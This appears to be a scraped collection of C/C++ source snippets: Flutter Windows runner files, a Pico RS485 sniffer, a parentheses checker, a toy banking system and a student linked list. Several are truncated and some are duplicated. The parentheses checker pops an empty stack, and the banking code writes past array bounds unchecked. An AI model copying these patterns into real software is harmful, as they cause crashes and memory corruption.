    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <stdio.h>\n#include \"pico/stdlib.h\"\n#include <hardware/gpio.h>\n#include <hardware/uart.h>\n#include \"crc.h\"\n\n#define RS485_RX_PIN  21\n#define RS485_TX_PIN  20\n\nvolatile bool ledState = true;\n\nint main() {\n    stdio_init_all();\n\n    gpio_init(PICO_DEFAULT_LED_PIN);\n    gpio_set_dir(PICO_DEFAULT_LED_PIN, GPIO_OUT);\n    gpio_put(PICO_DEFAULT_LED_PIN, 1);\n\n    uart_init(uart1, 38400);\n    gpio_set_function(RS485_RX_PIN, GPIO_FUNC_UART);\n    gpio_set_function(RS485_TX_PIN, GPIO_FUNC_UART);\n\n    \n\n    while (true) {\n        // Wait for a null bute\n        uint8_t byte;\n        do { uart_read_blocking(uart1, &byte, 1); }\n        while (byte);\n\n        gpio_put(PICO_DEFAULT_LED_PIN, 0);\n        uint64_t timestamp = time_us_64();\n\n        // Read the destination\n        uint8_t dest;\n        uart_read_blocking(uart1, &dest, 1);\n\n        // Print header\n        uint32_t us = timestamp % 1000000;\n        uint32_t s = timestamp / (uint64_t)1000000;\n        uint32_t m = s / 60;\n        uint32_t h = m / 60;\n        printf(\"%c %02d:%02d:%02d.%06d \", (dest == 0x05)?'>':'<', h%24, m%60, s%60, us);\n        \n        // Read 0x7E\n        uart_read_blocking(uart1, &byte, 1);\n        //printf(\"7E \");\n\n        // Read data until next 0x7E\n        while (true) {\n            uart_read_blocking(uart1, &byte, 1);\n            if (byte == 0x7E) { break; }\n            printf(\"%02X\", byte);\n        }\n        //printf(\"7E \");\n        printf(\"\\n\");\n\n        gpio_put(PICO_DEFAULT_LED_PIN, 1);\n    }\n    return 0;\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\r\n#include <iomanip>\r\n#include <stack>\r\n#include <string>\r\nusing namespace std;\r\n\r\n// Function used to check if the parentheses in the expression are balanced or not\r\nbool balancedParentheses(string expr)\r\n{\r\n    // Stack of characters named p because the expression will contain parentheses\r\n    stack<char> p;\r\n    // for loop used in order to traverse the expression of parentheses\r\n    for (int i = 0; i < expr.length(); i++)\r\n    {\r\n        // If the expression contains open parentheses, meaning '('\r\n        if (expr[i] == '(')\r\n            p.push(expr[i]);\r\n        else\r\n            p.pop();\r\n    }\r\n    // Return empty stack\r\n    return (p.empty());\r\n}\r\n\r\n// main function, which will take the input from the user and display the output\r\n// of whether or not the expression contains balanced parentheses\r\nint main()\r\n{\r\n    string parenthesesExpression;\r\n    // The user inputting the parentheses expression that either does or does not have balanced parentheses.\r\n    cin >> parenthesesExpression;\r\n    if (balancedParentheses(parenthesesExpression))\r\n        // Output that will be displayed if the expression has balanced parentheses.\r\n        cout << \"Balanced\";\r\n    else\r\n        // Output that will be displayed if the expression's parentheses are not balanced.\r\n        cout << \"Not Balanced\";\r\n    return 0;\r\n}\r\n",
    "#include \"banking_system.h\"\r\n\r\nusing namespace std;\r\n\r\nBankingSystem::BankingSystem() : num_accounts(0) {}\r\n\r\nAccount *BankingSystem::findAccount(int account_number)\r\n{\r\n    for (int i = 0; i < num_accounts; ++i)\r\n    {\r\n        if (accounts[i].account_number == account_number)\r\n        {\r\n            return &accounts[i];\r\n        }\r\n    }\r\n    return nullptr;\r\n}\r\n\r\nvoid BankingSystem::createAccount(int account_number, const string &owner, double initial_balance)\r\n{\r\n    if (num_accounts >= MAX_ACCOUNTS)\r\n    {\r\n        cout << \"Error: Maximum number of accounts reached.\" << endl;\r\n        return;\r\n    }\r\n\r\n    Account new_account;\r\n    new_account.account_number = account_number;\r\n    new_account.owner = owner;\r\n    new_account.balance = initial_balance;\r\n    new_account.num_transactions = 0;\r\n\r\n    accounts[num_accounts++] = new_account;\r\n    cout << \"Account created successfully.\" << endl;\r\n}\r\n\r\nvoid BankingSystem::deposit(int account_number, double amount)\r\n{\r\n    Account *account = findAccount(account_number);\r\n    if (account == nullptr)\r\n    {\r\n        cout << \"Error: Account not found.\" << endl;\r\n        return;\r\n    }\r\n    if (amount <= 0)\r\n    {\r\n        cout << \"Error: Invalid amount.\" << endl;\r\n        return;\r\n    }\r\n    account->balance += amount;\r\n\r\n    // Update transaction history\r\n    Transaction *transaction = &account->transactions[account->num_transactions++];\r\n    transaction->account_number = account_number;\r\n    transaction->type = \"Deposit\";\r\n    transaction->amount = amount;\r\n\r\n    cout << \"Deposit successful. New balance: \" << account->balance << endl;\r\n}\r\n\r\nvoid BankingSystem::withdraw(int account_number, double amount)\r\n{\r\n    Account *account = findAccount(account_number);\r\n    if (account == nullptr)\r\n    {\r\n        cout << \"Error: Account not found.\" << endl;\r\n        return;\r\n    }\r\n    if (amount <= 0 || amount > account->balance)\r\n    {\r\n        cout << \"Error: Insufficient funds or invalid amount.\" << endl;\r\n        return;\r\n    }\r\n    account->balance -= amount;\r\n\r\n    // Update transaction history\r\n    Transaction *transaction = &account->transactions[account->num_transactions++];\r\n    transaction->account_number = account_number;\r\n    transaction->type = \"Withdrawal\";\r\n    transaction->amount = amount;\r\n\r\n    cout << \"Withdrawal successful. New balance: \" << account->balance << endl;\r\n}\r\n\r\nvoid BankingSystem::transfer(int from_account_number, int to_account_number, double amount)\r\n{\r\n    Account *from_account = findAccount(from_account_number);\r\n    Account *to_account = findAccount(to_account_number);\r\n    if (from_account == nullptr || to_account == nullptr)\r\n    {\r\n        cout << \"Error: One or both accounts not found.\" << endl;\r\n        return;\r\n    }\r\n    if (amount <= 0 || amount > from_account->balance)\r\n    {\r\n        cout << \"Error: Insufficient funds or invalid amount.\" << endl;\r\n        return;\r\n    }\r\n    from_account->balance -= amount;\r\n    to_account->balance += amount;\r\n\r\n    // Update transaction history for both accounts\r\n    Transaction *transaction1 = &from_account->transactions[from_account->num_transactions++];\r\n    transaction1->account_number = from_account_number;\r\n    transaction1->type = \"Transfer (to)\";\r\n    transaction1->amount = amount;\r\n\r\n    Transaction *transaction2 = &to_account->transactions[to_account->num_transactions++];\r\n    transaction2->account_number = to_account_number;\r\n    transaction2->type = \"Transfer (from)\";\r\n    transaction2->amount = amount;\r\n\r\n    cout << \"Transfer successful. New balance for \" << from_account->owner << \": \" << from_account->balance << endl;\r\n    cout << \"New balance for \" << to_account->owner << \": \" << to_account->balance << endl;\r\n}\r\n\r\nvoid BankingSystem::calculateInterest(double rate)\r\n{\r\n    for (int i = 0; i < num_accounts; ++i)\r\n    {\r\n        accounts[i].balance *= (1 + rate);\r\n    }\r\n    cout << \"Interest calculated and applied to all accounts.\" << endl;\r\n}\r\n\r\nvoid BankingSystem::displayTransactions(int account_number)\r\n{\r\n    Account *account = findAccount(account_number);\r\n    if (account == nullptr)\r\n    {\r\n        cout << \"Error: Account not found.\" << endl;\r\n        return;\r\n    }\r\n    cout << \"Transaction history for account \" << account->account_number << \" (\" << account->owner << \"):\" << endl;\r\n    for (int i = 0; i < account->num_transactions; ++i)\r\n    {\r\n        Transaction *transaction = &account->transactions[i];\r\n        cout << \"Type: \" << transaction->type << \", Amount: \" << transaction->amount << endl;\r\n    }\r\n}\r\n\r\nvoid BankingSystem::deleteAccount(int account_number)\r\n{\r\n    for (int i = 0; i < num_accounts; ++i)\r\n    {\r\n        if (accounts[i].account_number == account_number)\r\n        {\r\n            // Shift remaining accounts to fill the gap\r\n            for (int j = i; j < num_accounts - 1; ++j)\r\n            {\r\n                accounts[j] = accounts[j + 1];\r\n            }\r\n            num_accounts--;\r\n            cout << \"Account \" << account_number << \" deleted success",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\nstruct Node\n{\n    int noMhs;\n    string name;\n    Node* next;\n    Node* prev;\n};\n\nNode* START = NULL;\n\nvoid addNode() {\n    Node* newNode = new Node(); // STEP 1: create a new node\n    cout << \"\\nEnter the roll number of student: \";\n    cin >> newNode->noMhs;      // assign value to the data field of the new node\n    cout << \"\\nEnter the name of the student: \";\n    cin >> newNode->name;       // Assign value to the data field of the new node\n\n    // Insert the new node in the list\n    if (START == NULL || newNode->noMhs <= START->noMhs) { // STEP 2: insert the new node\n        \n        if (START != NULL && newNode->noMhs == START->noMhs) {\n            cout << \"\\033[31mDuplicate roll not allowed\\033[0m\" << endl;\n            return;\n        }\n        // If the list is empty, make the new node the START\n        newNode->next = START;  //STEP 3: make the new node point to the first node\n        if (START != NULL) {    \n            START->prev = newNode;  //STEP 4: make the first node point to the new node\n        }\n        newNode->prev = NULL;       //STEP 5: make the new node point to NULL\n        START = newNode;            //STEP 6: make the new node the first node\n    }\n    else {\n        // insert the new node in the middle or at the end\n        Node* current = START; // STEP 1.a: start from the first\n        Node* previous = NULL; // STEP 1.b: previous node is NULL initially\n\n        while (current != NULL && current->noMhs < newNode->noMhs) { // STEP 1.c: traver\n            previous = current; // STEP 1.d: move the previous to the current Node\n            current = current->next; // STEP 1.e: move the current to the next node\n        }\n\n        newNode->next = current; // STEP 4: Make the next field of the new node point to current\n        newNode->prev = previous; // STEP 5: Make the previous field of the new node point to previous\n        \n        if (current != NULL) {\n            current->prev = newNode; // STEP 6: Make the previous field of the current\n        }\n\n        if (previous != NULL) {\n            previous->next = newNode; // STEP 7 : make the next field of the previous node\n        }\n        else {\n            //If previous is still NULL, it means newNode is now the first node\n            START = newNode;\n        }\n    }\n}\n\nbool search(int rollNo, Node** previous, Node** current)\n{\n    *previous = NULL;\n    *current = START;\n    while (*current != NULL && (*current)->noMhs != rollNo)\n    {\n        *previous = *current;\n        *current = (*current)->next;\n    }\n    return (*current != NULL);\n}\n\nvoid deleteNode()\n{\n    Node* previous, * current;\n    int rollNo;\n\n    cout << \"\\nEnter the roll number of the student whose record is to be deleted: \";\n    cin >> rollNo;                                                                  //STEP 3: get the roll number to be deleted\n\n    if (START == NULL)\n    {\n        cout << \"List is empety\" << endl;\n        return;\n    }\n\n    current = START;                                                               //STEP 1: start from the first node\n    previous = NULL;\n\n    //locate the node to be deleted\n    while (current != NULL && current->noMhs != rollNo)\n    {\n        previous = current;\n        current = current->next;\n    }\n\n    if (current == NULL)\n    {\n        cout << \"\\033[31mThe record with roll number \" << rollNo << \"not found\\033[0m\" << endl;\n        return;\n    }\n\n    //Node to be deleted is the firts node\n    if (current == START)\n    {\n        START = START->next;                                            //STEP 2: update the START pointer\n        if (START != NULL)\n        {\n            START->prev = NULL;                                         //step\n        }\n    }\n    else\n    {   //Node to be deleted is not the first node\n        previous->next = current->next;\n        if (current->next != NULL)\n        {   //if there's successor, update is prev pointer\n            current->next->prev = previous;\n        }\n    }\n\n    //release the memory of the node marked as current\n    delete current;\n    cout << \"\\x1b[32mRecord with roll number \" << rollNo << \"deleted\\x1b[0m\" << endl;\n}\n\nbool listEmpty()\n{\n    return (START == NULL);\n}\n\nvoid traverse()\n{\n    if (listEmpty())\n        cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecord is ascending order of roll number are:  \" << endl;\n        Node* currentNode = START;              //STEP 1\n        while (currentNode != NULL)             //STEP 2\n        {\n            cout << currentNode->noMhs << \" \" << currentNode->name << endl;         //STEP 3\n            currentNode = currentNode->next;                                        //STEP 4\n        }\n    }\n}\n\nvoid revtraverse()\n{\n    if (listEmpty())\n        cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecord is descending order of roll number are:  \" << endl;\n        Node* currentNode = START;\n        while (currentNode->next != NULL)\n      ",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\nstruct Node\n{\n    int noMhs;\n    string name;\n    Node* next;\n    Node* prev;\n};\n\nNode* START = NULL;\n\nvoid addNode() {\n    Node* newNode = new Node(); // STEP 1: create a new node\n    cout << \"\\nEnter the roll number of student: \";\n    cin >> newNode->noMhs;      // assign value to the data field of the new node\n    cout << \"\\nEnter the name of the student: \";\n    cin >> newNode->name;       // Assign value to the data field of the new node\n\n    // Insert the new node in the list\n    if (START == NULL || newNode->noMhs <= START->noMhs) { // STEP 2: insert the new node\n        \n        if (START != NULL && newNode->noMhs == START->noMhs) {\n            cout << \"\\033[31mDuplicate roll not allowed\\033[0m\" << endl;\n            return;\n        }\n        // If the list is empty, make the new node the START\n        newNode->next = START;  //STEP 3: make the new node point to the first node\n        if (START != NULL) {    \n            START->prev = newNode;  //STEP 4: make the first node point to the new node\n        }\n        newNode->prev = NULL;       //STEP 5: make the new node point to NULL\n        START = newNode;            //STEP 6: make the new node the first node\n    }\n    else {\n        // insert the new node in the middle or at the end\n        Node* current = START; // STEP 1.a: start from the first\n        Node* previous = NULL; // STEP 1.b: previous node is NULL initially\n\n        while (current != NULL && current->noMhs < newNode->noMhs) { // STEP 1.c: traver\n            previous = current; // STEP 1.d: move the previous to the current Node\n            current = current->next; // STEP 1.e: move the current to the next node\n        }\n\n        newNode->next = current; // STEP 4: Make the next field of the new node point to current\n        newNode->prev = previous; // STEP 5: Make the previous field of the new node point to previous\n        \n        if (current != NULL) {\n            current->prev = newNode; // STEP 6: Make the previous field of the current\n        }\n\n        if (previous != NULL) {\n            previous->next = newNode; // STEP 7 : make the next field of the previous node\n        }\n        else {\n            //If previous is still NULL, it means newNode is now the first node\n            START = newNode;\n        }\n    }\n}\n\nbool search(int rollNo, Node** previous, Node** current)\n{\n    *previous = NULL;\n    *current = START;\n    while (*current != NULL && (*current)->noMhs != rollNo)\n    {\n        *previous = *current;\n        *current = (*current)->next;\n    }\n    return (*current != NULL);\n}\n\nvoid deleteNode()\n{\n    Node* previous, * current;\n    int rollNo;\n\n    cout << \"\\nEnter the roll number of the student whose record is to be deleted: \";\n    cin >> rollNo;                                                                  //STEP 3: get the roll number to be deleted\n\n    if (START == NULL)\n    {\n        cout << \"List is empety\" << endl;\n        return;\n    }\n\n    current = START;                                                               //STEP 1: start from the first node\n    previous = NULL;\n\n    //locate the node to be deleted\n    while (current != NULL && current->noMhs != rollNo)\n    {\n        previous = current;\n        current = current->next;\n    }\n\n    if (current == NULL)\n    {\n        cout << \"\\033[31mThe record with roll number \" << rollNo << \"not found\\033[0m\" << endl;\n        return;\n    }\n\n    //Node to be deleted is the firts node\n    if (current == START)\n    {\n        START = START->next;                                            //STEP 2: update the START pointer\n        if (START != NULL)\n        {\n            START->prev = NULL;                                         //step\n        }\n    }\n    else\n    {   //Node to be deleted is not the first node\n        previous->next = current->next;\n        if (current->next != NULL)\n        {   //if there's successor, update is prev pointer\n            current->next->prev = previous;\n        }\n    }\n\n    //release the memory of the node marked as current\n    delete current;\n    cout << \"\\x1b[32mRecord with roll number \" << rollNo << \"deleted\\x1b[0m\" << endl;\n}\n\nbool listEmpty()\n{\n    return (START == NULL);\n}\n\nvoid traverse()\n{\n    if (listEmpty())\n       